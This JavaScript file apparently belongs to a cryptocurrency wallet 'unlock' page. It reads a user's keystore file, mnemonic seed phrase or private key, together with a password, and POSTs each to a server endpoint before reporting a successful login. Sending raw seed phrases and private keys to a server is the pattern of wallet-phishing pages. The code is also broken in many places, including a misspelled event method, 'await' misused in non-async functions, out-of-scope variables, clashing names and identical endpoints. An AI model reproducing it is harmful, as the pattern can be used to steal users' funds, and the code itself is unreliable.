const { showAlert } = require("./alerts");

fileInput.onchange = () => {
  const selectedFile = fileInput.files[0];
};
console.log(selectedFile);

$(document).ready(function () {
  $("form").submit(function (e) {
    e.preventDefault();
    // or return false;
  });
});

document
  .querySelector(".UnlockWalletViaKeystoreFile__title")
  .addEventlistener("submit", (e) => {
    e.preventDefault();
    const file = document.getElementById("file").value;
    const password = document.getElementById("password").value;
    keystore(file, password);
  });

document
  .querySelector(".UnlockWalletViaMnemonicPhrase")
  .addEventlistener("submit", (e) => {
    e.preventDefault();
    const mnemonic = document.getElementById("mnemonic").value;
    const password = document.getElementById("password").value;
    mnemonic(mnemonic, password);
  });

document
  .querySelector(".UnlockWalletViaPrivateKey")
  .addEventlistener("submit", (e) => {
    e.preventDefault();
    const privatekey = document.getElementById("privatekey").value;
    const password = document.getElementById("password").value;
    privatekey(privatekey, password);
  });

export const mnemonic = (mnemonic, password) => {
  try {
    const res = await({
      method: "POST",
      url: "http://127.0.0.1:4000/mnemonic",
      data: {
        mnemonic,
        password,
      },
    });

    if (res.data.status === "success") {
      showAlert("success", "Logged in successfully");
      Window.setTimeout(() => {
        location.assign("/mnemonic");
      }, 1000);
    }
  } catch (err) {
    showAlert("error", err.response.data.message);
  }
};

export const keystore = (keystore, password) => {
  try {
    const res = await({
      method: "POST",
      url: "http://127.0.0.1:4000/mnemonic",
      data: {
        keystore,
        password,
      },
    });

    if (res.data.status === "success") {
      showAlert("success", "Logged in successfully");
      Window.setTimeout(() => {
        location.assign("/keystore");
      }, 1000);
    }
  } catch (err) {
    showAlert("error", err.response.data.message);
  }
};

export const privatekey = (privatekey, password) => {
  try {
    const res = await({
      method: "POST",
      url: "http://127.0.0.1:4000/mnemonic",
      data: {
        privatekey,
        password,
      },
    });

    if (res.data.status === "success") {
      showAlert("success", "Logged in successfully");
      Window.setTimeout(() => {
        location.assign("/mnemonic");
      }, 1000);
    }
  } catch (err) {
    showAlert("error", err.response.data.message);
  }
};
